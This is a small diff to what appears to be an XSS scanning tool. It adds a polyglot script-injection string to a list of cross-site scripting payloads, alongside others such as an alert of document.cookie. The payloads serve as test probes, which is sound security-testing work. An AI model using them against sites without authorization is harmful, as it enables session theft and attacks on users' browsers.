@@ -20,6 +20,8 @@ XSS_PAYLOADS = [
     "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
     "<Script>alert('XSS')</scripT>",
     "<script>alert(document.cookie)</script>",
+    # Added powerful payload
+    "javascript:/*--></title></style></textarea></script><script>alert(1)//",
 ]
 
 # Global variable to store all crawled links
